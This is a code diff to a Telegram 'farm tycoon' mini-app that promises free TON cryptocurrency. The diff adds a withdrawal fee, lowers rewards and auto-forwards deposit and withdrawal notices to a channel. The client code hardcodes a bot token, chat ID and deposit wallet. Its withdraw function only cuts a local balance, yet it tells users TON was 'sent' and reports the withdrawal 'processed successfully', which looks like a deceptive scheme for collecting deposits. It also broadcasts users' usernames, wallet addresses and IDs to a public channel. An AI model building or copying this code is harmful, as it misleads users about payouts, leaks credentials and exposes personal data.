@@ -209,6 +209,16 @@
             0%, 100% { transform: translateX(-50%) translateY(0px); }
             50% { transform: translateX(-50%) translateY(-10px); }
         }
+        .fee-note {
+            background: #FFF3E0;
+            border-radius: 1rem;
+            padding: 0.5rem;
+            text-align: center;
+            font-size: 0.75rem;
+            font-weight: bold;
+            color: #FF8C00;
+            margin-top: 0.5rem;
+        }
     </style>
 </head>
 <body>
@@ -247,9 +257,10 @@
         const DEPOSIT_ADDRESS = "UQCiFbR0TEsk_iHjxKopxSfzeA-DxCSOi7YXwqrIsmy0KyT-";
         const GIGAPUB_ID = '5793';
         
-        // Bot Token
+        // Bot Token & Channel ID
         const BOT_TOKEN = '8115772390:AAEsj1eh7aiPjRvtEY7hjYUPcmYeA21ojGA';
         const CHAT_ID = '7511030198';
+        const CHANNEL_ID = '@Feeddy735';  // Channel for auto-forward
         
         const DEPOSIT_CODES = [
             'Xiotyre76', 'Jsvowb470', 'Ksvyelp6429', 'Jvekie328', 'Uscrpgwn7248',
@@ -325,25 +336,35 @@
             });
         };
 
-        // Send Telegram Message
-        const sendTelegramMessage = async (message) => {
+        // Send Telegram Message with forward to channel
+        const sendTelegramMessage = async (message, forwardToChannel = false) => {
             try {
+                // Send to admin/bot chat
                 await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({ chat_id: CHAT_ID, text: message })
                 });
+                
+                // Auto-forward to channel if requested
+                if (forwardToChannel && CHANNEL_ID) {
+                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ chat_id: CHANNEL_ID, text: `📢 ${message}` })
+                    });
+                }
             } catch(e) { console.error('Telegram error:', e); }
         };
 
         const sendDepositRequest = async (username, tonAddress, userId) => {
             const message = `💰 NEW DEPOSIT REQUEST!\n\n👤 Telegram Username: @${username}\n💳 TON Address: ${tonAddress}\n🆔 User ID: ${userId}\n💎 Amount: 1 TON\n\n📌 Send deposit code to user.`;
-            await sendTelegramMessage(message);
+            await sendTelegramMessage(message, true); // Auto-forward to channel
         };
 
-        const sendWithdrawalNotification = async (address, amount, time) => {
-            const message = `💸 WITHDRAWAL REQUEST!\n\n💳 TON Address: ${address}\n💎 Amount: ${amount.toFixed(4)} TON\n⏰ Time: ${time}\n\n✅ Withdrawal processed successfully.`;
-            await sendTelegramMessage(message);
+        const sendWithdrawalNotification = async (address, amount, time, fee) => {
+            const message = `💸 WITHDRAWAL REQUEST!\n\n💳 TON Address: ${address}\n💎 Amount: ${amount.toFixed(4)} TON (Fee: ${fee.toFixed(4)} TON deducted)\n⏰ Time: ${time}\n✅ Withdrawal processed successfully.`;
+            await sendTelegramMessage(message, true); // Auto-forward to channel
         };
 
         const STORAGE_KEY = 'rice_farm_tycoon_v18';
@@ -374,7 +395,7 @@
             const canvasRef = useRef(null);
             const autoAdInterval = useRef(null);
             
-            const totalMilkPerCollection = 20 + cows.reduce((total, cow) => total + COW_BREEDS[cow.breed].rate, 0);
+            const totalMilkPerCollection = 10 + cows.reduce((total, cow) => total + COW_BREEDS[cow.breed].rate, 0); // Base changed to 10L
             
             useEffect(() => {
                 initGigapub();
@@ -564,7 +585,6 @@
                     
                     // Draw big cow on grass when no cows
                     if (cows.length === 0) {
-                        // Big cow emoji on grass
                         ctx.font = '160px sans-serif';
                         ctx.fillStyle = '#5D4037';
                         ctx.shadowBlur = 0;
@@ -611,7 +631,7 @@
                     showToast(`🎉 +${totalMilkPerCollection} Milk collected! Next in 60 minutes.`);
                     sm.play('collect');
                 } catch(e) { 
-                    showToast("Ad completed! +20 Milk!");
+                    showToast("Ad completed! +10 Milk!");
                     setInventory(prev => ({ ...prev, milk: prev.milk + totalMilkPerCollection }));
                     setLastMilkTime(Date.now());
                     setAnimateMilk(true);
@@ -726,13 +746,18 @@
                     showToast("⚠️ Need 1 referral for 2nd withdrawal!");
                     return;
                 }
+                // Fee calculation: 0.01 TON fee deducted
+                const fee = 0.01;
+                const amountAfterFee = amount - fee;
+                if (amountAfterFee < 0.01) { showToast("❌ Amount too low after fee (0.01 TON fee). Minimum withdraw 0.05 TON before fee."); return; }
+                
                 setBalance(prev => prev - amount);
                 setTotalWithdrawn(prev => prev + amount);
                 const now = new Date();
                 const timeStr = now.toLocaleString();
-                showToast(`💸 Withdrawn ${amount.toFixed(4)} TON`);
+                showToast(`💸 Withdrawn ${amount.toFixed(4)} TON (Fee: ${fee.toFixed(2)} TON) → ${amountAfterFee.toFixed(4)} TON sent`);
                 sm.play('click');
-                sendWithdrawalNotification(addr, amount, timeStr);
+                sendWithdrawalNotification(addr, amountAfterFee, timeStr, fee);
             };
             
             const handleRefer = () => {
@@ -784,7 +809,7 @@
                                         {cooldown > 0 && <span className="countdown-timer">⏰ {formatTime(cooldown)}</span>}
                                     </div>
                                     <div className="text-center mb-3">
-                                        <p className="text-lg font-bold text-purple-700">🥛 Base: 20L + Cows: {cows.reduce((t,c)=>t+COW_BREEDS[c.breed].rate,0)}L = {totalMilkPerCollection} L/collection</p>
+                                        <p className="text-lg font-bold text-purple-700">🥛 Base: 10L + Cows: {cows.reduce((t,c)=>t+COW_BREEDS[c.breed].rate,0)}L = {totalMilkPerCollection} L/collection</p>
                                         <p className="text-xs text-gray-600">🐄 You have {cows.length} cows! Each cow adds production.</p>
                                     </div>
                                     <button onClick={handleMilkCollect} disabled={cooldown > 0 || isCollecting} className={`cartoon-button w-full ${cooldown > 0 ? 'bg-gray-500' : 'bg-purple-500'} text-lg py-4`}>
@@ -835,7 +860,7 @@
                         
                         {page === 'tasks' && (
                             <div className="grass-field">
-                                <div className="big-cow mb-4">🐄</div>
+                                {/* Removed big-cow div */}
                                 <div className="cartoon-card bg-white/90 relative z-10">
                                     <h2 className="font-black text-2xl">📋 Earn Free TON</h2>
                                     <div className="bg-white p-4 rounded-2xl cartoon-border flex justify-between items-center mt-4">
@@ -919,10 +944,13 @@
                             <div className="cartoon-card space-y-4">
                                 {totalWithdrawn >= 1 && referralEarnings === 0 && (<div className="warning-banner">⚠️ Need 1 referral for 2nd withdrawal! Go to Referral page.</div>)}
                                 <div className="text-center"><h3 className="text-4xl font-black">{balance.toFixed(4)}</h3><p className="text-sm">Available TON</p></div>
+                                <div className="fee-note">
+                                    💸 Withdrawal Fee: 0.01 TON (deducted from amount)
+                                </div>
                                 <input id="withdrawAddr" type="text" placeholder="TON Wallet Address" className="w-full p-3 rounded-xl cartoon-border" />
                                 <input id="withdrawAmount" type="number" placeholder="Amount (min 0.05)" step="0.01" className="w-full p-3 rounded-xl cartoon-border" />
-                                <button onClick={handleWithdraw} className="cartoon-button w-full bg-green-500 py-4">Withdraw</button>
-                                <p className="text-xs text-center">Min: 0.05 TON | 2nd+ withdrawal needs 1 referral</p>
+                                <button onClick={handleWithdraw} className="cartoon-button w-full bg-green-500 py-4">Withdraw (Fee 0.01 TON)</button>
+                                <p className="text-xs text-center">Min: 0.05 TON | 0.01 TON fee applies | 2nd+ withdrawal needs 1 referral</p>
                             </div>
                         )}
                     </main>
